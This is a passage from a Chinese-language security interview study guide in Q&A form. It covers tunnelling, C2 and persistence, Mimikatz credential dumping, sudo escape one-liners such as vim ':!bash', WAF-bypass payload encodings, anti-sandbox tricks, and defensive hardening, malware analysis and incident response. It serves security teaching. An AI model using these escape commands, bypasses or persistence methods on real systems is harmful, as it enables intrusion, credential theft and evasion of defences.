  • 反向/反弹代理：目标主动外连出网（内网无出网限制时），攻击机监听（frp 反向、ngrok 类）
  • SOCKS5 代理：proxychains 配合 frp/ew 实现全局代理访问内网
  • HTTP 隧道：内网 HTTP 协议出网时用（reGeorg、Neo-reGeorg 部署 Web 隧道脚本）
  • DNS 隧道：仅 DNS 出网时的最后手段（dnscat2、iodine）
  • ICMP 隧道：icmpsh 用 ping 报文传数据

选型口诀：出网多 → SOCKS5；只走 HTTP → reGeorg；只走 DNS → dnscat2；啥都没有 → ICMP。

隧道就是「内网的桥」；记「frp 通用、reGeorg 过 HTTP、dnscat2 走 DNS、icmpsh 打 ICMP」
Q
C2 服务器与权限维持的方式？

C2（Command and Control）：攻击者控制受害主机的指挥中心，通过 C2 下发命令、接收回传。主流框架：Cobalt Strike（CS）、Metasploit、Sliver、Havoc。

C2 通信：HTTPS 加密、DNS 隧道、域名前置（CDN 隐藏）、Beacon 分阶段上线，检测难点是流量伪装。

权限维持：

  • Windows：计划任务、服务、注册表 Run 键、WMI 事件订阅、映像劫持、注入白名单进程
  • Linux：crontab、systemd 服务、SSH 后门（authorized_keys）、Rootkit、LD_PRELOAD
  • 域内：创建隐藏账户、AdminSDHolder 提权后门、SID History、组策略后门
C2 是「遥控器」，权限维持是「藏后门」；记「计划任务常驻、注册表自启、SSH 密钥后门」老三样
Q
内网渗透常用工具有哪些？
  • 信息收集：BloodHound（AD 路径）、SharpHound（采集）、PingCastle（域风险评估）
  • 凭据抓取：Mimikatz（sekurlsa::logonpasswords）、Procdump + 离线分析 lsass

  • 隧道代理：frp、ew（EarthWorm）、nps、Chisel、reGeorg
  • 综合框架：Cobalt Strike（Beacon 管理 + 横向）、MSF

推荐组合：BloodHound 找路径 → Mimikatz 抓凭据 → CME 批量探测 → frp 打隧道 → CS 做管理。

内网工具口诀「BloodHound 看路、Mimikatz 抓账、CME 批量试、frp 搭桥、CS 当总部」

06系统安全加固

Q
Linux 服务器安全加固的要点？🔥 高频
  • 账户与口令：禁用 root 远程登录（PermitRootLogin no）、空密码、弱口令；`passwd -l` 锁定无用账户；口令策略（密码长度/过期/复杂度）
  • SSH 安全：改默认端口、禁止密码登录改用密钥认证、限制来源 IP、fail2ban 防爆破
  • 权限最小化：普通用户运行服务（非 root）、sudo 白名单、重要文件权限（/etc/shadow 640）
  • 服务与端口：关闭不必要服务（telnet/rlogin）、`ss -lntup` 审计监听端口、防火墙 firewalld/iptables 只放行必要端口
  • 补丁与软件：及时更新内核与软件、卸载危险工具（编译器、抓包工具按需）
  • 日志与监控：开启 auditd、集中日志、/var/log 定期审计、文件完整性校验（AIDE/tripwire）
Linux 加固口诀「禁 root 远程、密钥登 SSH、最小权限、关多余服务、勤打补丁、留好日志」
Q
Windows 服务器安全加固要点？
  • 账户策略：密码复杂度、锁定策略、禁用 Guest/匿名访问、删除多余账户
  • 补丁管理：WSUS/系统更新及时安装，重点高危（永恒之蓝 MS17-010）
  • 服务最小化：关闭不必要服务（Server、Print Spooler 视业务）、禁用危险组件（WScript/宏）
  • 防火墙与端口：默认拒绝入站、仅开放业务端口、关闭 445/139/3389 暴露面（或用 VPN）
  • 权限与审计：本地管理员组最小化、启用审核策略（登录/账户管理）、事件日志集中收集
  • 安全功能：开启 Credential Guard、BitLocker、Defender、禁用 NTLM 尽量用 Kerberos
Windows 加固「打补丁、关服务、锁账户、开审计、防内网 445」；等保基线照着做
Q
sudo 的安全配置与提权风险？

正确配置：

  • visudo 编辑 /etc/sudoers，按最小权限给命令白名单，如 `user ALL=(ALL) NOPASSWD: /usr/bin/systemctl`
  • 禁止 sudo ALL 通配；避免把 vim/less 等可逃逸命令直接放 sudo 白名单
  • 设置 secure_path 防止 PATH 劫持；默认 timestamp_timeout 控制缓存时间

提权风险（GTFOBins 套路）：vim → `:!bash`、find → `-exec sh`、python → `import os; os.system('/bin/bash')`、less → `!bash`，只要这些命令能免密 sudo，就能提权到 root。

sudo 配置「白名单最小化、防逃逸命令」；渗透视角「sudo -l 看一眼，GTFOBins 里找逃逸」
Q
SELinux 和 AppArmor 的作用？

两者都是 Linux 的强制访问控制（MAC）机制，在传统 DAC（属主/组权限）之上做精细管控。

  • SELinux：基于标签（Label）与策略（Policy），进程、文件、端口都有安全上下文，默认 deny；三个模式：Enforcing（强制）/ Permissive（宽容）/ Disabled；配置在 /etc/selinux/config
  • AppArmor：基于路径的配置文件（/etc/apparmor.d），声明「该程序能访问哪些文件/网络」，比 SELinux 易上手
  • 价值：即使 Web 服务被攻破，MAC 限制其读写范围，把单点漏洞的影响隔离在容器/进程边界内

渗透视角：SELinux 开启会阻碍很多提权与写入（如写 WebShell 后无法执行），渗透前先 `getenforce` 看状态。

SELinux「标签 + 策略强制访问」、AppArmor「路径声明」；都是「服务被攻破也跑不远」的笼子
Q
什么是安全基线检查？

安全基线：一套被认可的最低安全配置标准，覆盖系统、中间件、数据库、网络设备，用于衡量配置是否合规。

  • 检查项：口令策略、账户权限、服务端口、补丁、日志审计、加密协议、危险函数禁用等
  • 标准来源：等保 2.0、CIS Benchmarks、等保测评机构规范
  • 工具：等保自查工具、CIS-CAT、OpenSCAP（自动化基线扫描）、自研脚本（对照检查项）
  • 流程：检查 → 差距分析 → 整改 → 复核闭环
基线就是「安全体检表」；流程「检查 → 差距 → 整改 → 复核」四步闭环
Q
日志审计主要看哪些日志？
  • 系统日志：/var/log/secure（认证）、/var/log/messages（系统）、last/lastlog（登录记录）、wtmp/btmp（成功/失败登录）
  • Web 日志：Nginx/Apache access.log（URL、UA、状态码、来源 IP）——注入、扫描、爆破痕迹都在这里
  • 应用日志：业务操作日志、错误日志（可能泄露 SQL/堆栈）
  • 数据库日志：MySQL general log、慢查询；Windows 事件日志：登录事件 4624/4625（成功/失败）、账户 4720/4732、服务安装 7045

审计要点：异常登录（时间/地点/IP）、提权操作、异常命令、文件篡改、外连行为；配合日志集中平台（ELK/SIEM）做关联分析。

日志审计记「认证看 secure、攻击看 access、登录看 4624/4625」；重点盯「异常时间、异常 IP、异常行为」
Q
PAM 是什么？如何设置口令策略？🔥 高频

PAM（Pluggable Authentication Modules，可插拔认证模块）是 Linux 统一认证框架，认证逻辑以模块形式插到 /etc/pam.d/ 下的服务配置中。

口令策略配置：

  • /etc/pam.d/system-auth / password-auth 加 pam_pwquality.so：`minlen=12 ucredit=-1 lcredit=-1 dcredit=-1`（长度+大小写+数字）
  • /etc/login.defs：PASS_MAX_DAYS 90（有效期）、PASS_MIN_LEN、PASS_WARN_AGE
  • /etc/security/pwquality.conf：统一密码复杂度规则
  • 锁定策略：pam_faillock 连续失败 N 次锁定账户；pam_tally2（旧）

绕过提醒：PAM 后门（替换 pam_unix.so）是常见持久化手段，加固要校验模块完整性。

PAM 是「认证插线板」；口令策略三件套「pwquality 定复杂度、login.defs 定周期、faillock 定锁定」

07网络设备与边界安全

Q
防火墙的原理与类型？🔥 高频

防火墙：网络边界的安全设备，按规则允许/拒绝流量，是内外网的第一道防线。

  • 包过滤防火墙：按五元组（源/目的 IP、源/目的端口、协议）过滤，速度快、无状态，易被绕过
  • 状态检测防火墙：跟踪连接状态，只放行「合法连接的回包」，主流基础能力
  • 应用层防火墙/WAF：深度检测应用层内容（URL、Payload），防 SQL 注入/XSS 等
  • 下一代防火墙 NGFW：状态检测 + 应用识别 + IPS + 威胁情报联动

渗透视角：防火墙不代表安全，允许端口上的漏洞照样打；用隧道（DNS/HTTP）可绕过策略限制。

防火墙演进「包过滤 → 状态检测 → 应用层 → NGFW」；本质「按规则放行，管不管得住看你」
Q
IDS 与 IPS 的区别？
  • IDS（入侵检测系统）：被动旁路监听流量，发现攻击告警不拦截；误报影响小，适合合规与监测
  • IPS（入侵防御系统）：串联在线，检测到攻击直接阻断；实时防护但可能误杀业务流量
  • 检测方式：特征匹配（Snort/Suricata 规则）、异常行为基线、威胁情报
  • 部署：IDS 接镜像口、IPS 串在链路上；WAF 是应用层专精版 IPS

绕过思路：编码变形（URL 编码/分块传输）、加密流量、低频慢速攻击、分片绕过检测。

IDS 是「监控探头只报警」、IPS 是「门卫直接拦」；一个旁路一个串联
Q
WAF 的原理与绕过方式？🔥 高频

WAF（Web 应用防火墙）：专门防护 Web 层攻击（SQL 注入、XSS、CC），部署在 Web 前：云 WAF（DNS 接入）、硬件 WAF、软件 WAF（ModSecurity）。

常见绕过：

  • 编码绕过：URL 双重编码、Unicode 编码、HTML 实体编码（`%2527`、`'`）
  • 大小写与关键字变形：`SeLeCt`、`/**/union/**/select`、`UNION+SELECT` 内联注释
  • 分块传输：Chunked Transfer Encoding 拆分 Payload 绕特征检测
  • 协议特性：HTTP 参数污染（HPP）、Content-Type 切换（multipart）、畸形请求
  • 数据变形：`concat`/十六进制/`chr()` 构造关键字、`0x` 编码

前提：摸清 WAF 类型（wafw00f 识别），针对其规则白名单与解析差异做「语义等价变形」。

WAF 绕过记「编码、变形、分块、污染、畸形」五招；本质是「让 WAF 看到的不等于后端执行的」
Q
DDoS 攻击的类型与防御？🔥 高频

DDoS（分布式拒绝服务）：大量攻击源耗尽目标资源，使其无法提供服务。

  • 流量型：UDP Flood、ICMP Flood、DNS 放大反射（放大倍数几十倍）——打带宽
  • 连接型：SYN Flood（半连接）、ACK Flood——打连接表
  • 应用型：CC 攻击（高频慢速请求）、HTTP Flood、慢速连接（Slowloris）——打应用资源
  • 新型：物联网僵尸网络（Mirai）、反射放大组合（NTP/memcached）

防御：

  • 高防 IP/云清洗（运营商黑洞 + 流量牵引清洗）
  • SYN Cookie 防半连接、连接超时与速率限制、CDN 隐藏源站
  • 应用层：WAF 限频、验证码、IP 信誉库、负载均衡扩容
DDoS 三类「流量型打带宽、连接型打表、应用型打 CPU」；防御「高防清洗 + SYN Cookie + 限频」
Q
中间人攻击（MITM）的原理与防御？🔥 高频

原理：攻击者插入通信双方之间，双方都以为在与对方通信，攻击者转发并窃听/篡改流量。

常见场景：

  • ARP 欺骗：伪造 ARP 应答，让网关流量经过攻击机（局域网经典 MITM）
  • DNS 欺骗：伪造 DNS 应答，把用户导向钓鱼服务器
  • WiFi 钓鱼：伪造同名热点，全流量可见
  • SSL 剥离：把 HTTPS 降级为 HTTP 再抓包（HTTPS 拦截需伪造证书且用户信任）

防御：全站 HTTPS + HSTS（禁止降级）、证书校验（防伪造证书）、双向认证、网络层：ARP 静态绑定/DAI、802.1X、加密隧道（VPN）。

MITM 是「两个人中间插了个传话鬼」；防「加密 + 验证书 + 防 ARP 欺骗」
Q
ARP 欺骗的原理与防御？

原理：ARP 是无认证的广播协议，攻击者发送伪造 ARP 应答，宣称「我是网关/我是目标 IP」，受害主机更新 ARP 缓存，流量被劫持到攻击机。

  • 双向欺骗：同时欺骗受害主机与网关，流量完全经过攻击机
  • 危害：嗅探口令、篡改流量、DNS 欺骗、会话劫持
  • 工具：Ettercap、Bettercap、arpspoof

防御：

  • 静态 ARP 表：网关 IP-MAC 手动绑定
  • 交换机开启 DAI（动态 ARP 检测） + DHCP Snooping，校验 ARP 报文
  • 关键传输走加密（HTTPS/SSH），即使被劫持也读不到明文
ARP 欺骗「说自己是网关，全村的流量都进我家」；防御「静态绑定 + DAI + 加密传输」
Q
DNS 劫持的防御与 DNSSEC？

DNS 劫持场景：本地 hosts 被改、路由器 DNS 被改（弱口令）、运营商/上游 DNS 被污染、域名商账户被盗改解析。

防御：

  • 客户端：DoH/DoT（加密 DNS 查询）、可信 DNS（223.5.5.5/119.29.29.29）、定期查 hosts 与路由器配置
  • 域名侧：域名商开启二次验证/锁定期、权限分离；网站侧 HTTPS + HSTS 降低解析被改的影响

DNSSEC：用数字签名给 DNS 应答做完整性校验，防止缓存投毒（伪造应答）。工作方式：权威服务器用私钥签名记录，解析器用公钥（DS 链）验证；缺点是运维复杂、仍不加密查询内容，因此常与 DoT/DoH 配合。

防 DNS 劫持「DoH 加密查询 + 可信 DNS」；DNSSEC 是「给 DNS 应答盖章防篡改」
Q
VLAN 的作用与 VLAN 跳跃攻击？

VLAN（虚拟局域网）：在交换机上按逻辑划分广播域，实现二层隔离（不同部门/安全域隔离），减小广播风暴与攻击面。

VLAN 跳跃（VLAN Hopping）：跨 VLAN 访问的攻击手法：

  • 双标签攻击（Double Tagging）：发送带两个 802.1Q 标签的帧，外层标签被交换机剥掉后帧进入内层标签的 VLAN，只对「native VLAN 上的端口」有效
  • 交换机伪装：利用 DTP 协议把端口协商成 Trunk，从而看到所有 VLAN 流量（需端口自动协商）

防御：关闭不用的 Trunk/DTP 协商、显式配置 Access 端口、native VLAN 改非常用 VLAN、端口安全。

VLAN 是「二层分房间」；跳跃攻击「双标签溜门、DTP 伪装成 trunk」；防「关协商、固定 access」

恶意代码静态分析的步骤？

不运行样本，从文件本身提取信息：

  • 指纹识别：计算哈希（MD5/SHA256），到 VT（VirusTotal）/微步查询信誉
  • PE 信息：PE 头、导入表（关键 API：CreateRemoteThread、VirtualAlloc、WriteProcessMemory 是注入特征）、导出表、节区（可疑节名/权限）
  • 字符串提取：URL、域名、IP、注册表键、互斥量（Mutex）、加密密钥（strings 命令）
  • 加壳检测：熵值高/节区异常（UPX、VMProtect）、编译语言识别（Exeinfo PE、DIE）
  • 反汇编：IDA Pro / Ghidra 分析关键函数、控制流、解密逻辑

工具：strings、DIE、Capa（能力标注）、IDA、Ghidra。

静态分析「哈希查信誉、导入表看 API、字符串挖 IOC、熵值判加壳、IDA 读逻辑」
Q
恶意代码动态分析的步骤？

在受控环境运行样本观察行为：

  • 环境准备：隔离虚拟机（快照恢复）、配置网络模拟（INetSim/伪造 DNS）防外联
  • 行为监控：Process Monitor（文件/注册表/进程）、Process Explorer（进程树）、Regshot（注册表快照对比）、Wireshark（网络流量）、APIMonitor（API 调用）
  • 关键动作：自启动项（Run 键/计划任务）、服务创建、注入进程、外连 C2、释放文件、下载器行为
  • 内存转储：Volatility 分析运行中内存（解密后 Payload、注入代码）

分析闭环：静态定特征 → 动态看行为 → 提取 IOC（IP/域名/哈希/文件）→ 写检测规则（YARA/特征）。

动态分析「隔离环境跑、行为监控录、流量抓外连、内存 dump 看干货」；产出 IOC 用于查杀
Q
沙箱检测与反沙箱对抗？

沙箱：自动化隔离分析环境，大批量跑样本看行为。检测沙箱的常见手段（恶意样本反沙箱）：

  • 环境特征：检测虚拟机/沙箱进程（vmtoolsd、procmon）、驱动、注册表、MAC 前缀（00:0C:29 VMware）
  • 硬件指纹：CPU 核数过少、内存过小、磁盘容量异常（沙箱配置低）
  • 交互检测：等待鼠标/键盘事件、要求人工点击（C2 交互确认）
  • 时间延迟：sleep 长延时、等待特定日期触发，拖过沙箱时限
  • 行为反制：检测到沙箱就休眠或运行无害行为，真实 Payload 延迟释放

对抗思路：沙箱要「模拟真实环境 + 加速时间 + 补交互」；分析人员遇到「样本不动」先怀疑反沙箱。

反沙箱四招「查环境特征、测硬件配置、等交互、拖时间」；样本「装死」先查这几样
Q
什么是加壳与脱壳？🔥 高频

加壳：用壳程序压缩/加密原始程序，运行时壳先执行，在内存中还原原始代码再跳转执行。目的：缩小体积、隐藏真实代码特征（免杀）、防逆向。

  • 常见壳：UPX（压缩壳，易脱）、ASPack、Themida、VMProtect（虚拟化壳，最难）
  • 检测：Exeinfo PE / DIE 识别壳类型；节区名（UPX0/UPX1）、熵值高、入口点（OEP）异常

脱壳思路：

  • 工具一键脱：`upx -d`（UPX 专属）
  • 动态脱壳：OD/x64dbg 下 ESP 定律（壳解压完会 popad，跟 ESP 到 OEP）
  • dump：到达 OEP 后 dump 内存镜像（Scylla/ImpRec 修复导入表）
  • 虚拟化壳：放弃静态还原，改做动态行为分析
加壳「把程序打包藏起来」、脱壳「拆包找真身」；口诀「UPX 一键、ESP 定律、到 OEP 就 dump」
Q
代码混淆的常见手段？
  • 字符串加密：敏感字符串（URL、密钥）加密存储，运行时解密，隐藏 IOC
  • 控制流平坦化：把正常 if/else 逻辑改成 switch 分发状态机，破坏可读性
  • 花指令：插入无效指令干扰反汇编（IDA 会解析错位）
  • 垃圾代码：大量无意义函数/分支增加分析量
  • 自修改代码：运行时改写自身指令，静态分析看到的不是真实逻辑
  • 加密/解密例程：Shellcode 或 Payload 用 XOR/AES 加密，内存解密执行（分离免杀）

分析应对：动态调试（x64dbg）、内存 dump、API 断点（看解密后参数）、自动化脚本（unidbg/Frida Hook）。

混淆套路「藏字符串、摊平流程、插花指令、改自己」；应对「动态跑 + Hook 看解密后」
Q
主机恶意代码清除的流程？
  • ① 隔离：断网/隔离 VLAN，防止横向与数据外传（保留现场，别急着关机，内存证据会丢）
  • ② 定位：查自启动（Run 键、计划任务、服务）、可疑进程（Process Explorer 查签名/路径）、文件时间线
  • ③ 提取证据：内存转储、恶意文件副本、日志、注册表导出（先取证再清除）
  • ④ 清除：结束进程 → 删除文件/自启动项 → 恢复被篡改项（hosts、主页）
  • ⑤ 修复与验证：补漏洞、改口令、杀软全盘扫描复检，确认无回弹
  • ⑥ 复盘：溯源入侵路径，加固入口（钓鱼培训/补丁/弱口令）

红线：先取证后清除；不清除不明样本副本，留作分析溯源。

清除六步「隔离、定位、取证、清除、修复、复盘」；核心「先取证再动手」

09应急响应与安全运营

Q
应急响应（IR）的标准流程？🔥 高频

参照 NIST SP 800-61 六阶段：

  • ① 准备（Preparation）：预案、工具、人员、备份就绪
  • ② 检测与分析（Detection & Analysis）：确认告警真实性、定级（影响面/资产价值）、确定攻击类型与范围
  • ③ 遏制（Containment）：先断网/隔离止损（短时策略），再升级防护（长时策略）
  • ④ 根除（Eradication）：清除恶意代码、修补漏洞、改口令
  • ⑤ 恢复（Recovery）：业务恢复、加强监控、验证无残留
  • ⑥ 复盘（Lessons Learned）：溯源、报告、改进机制

原则：先止损、保证据、快沟通、留记录；优先保核心业务与数据。

应急六步「准备、检测、遏制、根除、恢复、复盘」；红线「先断网止损、证据不能丢」
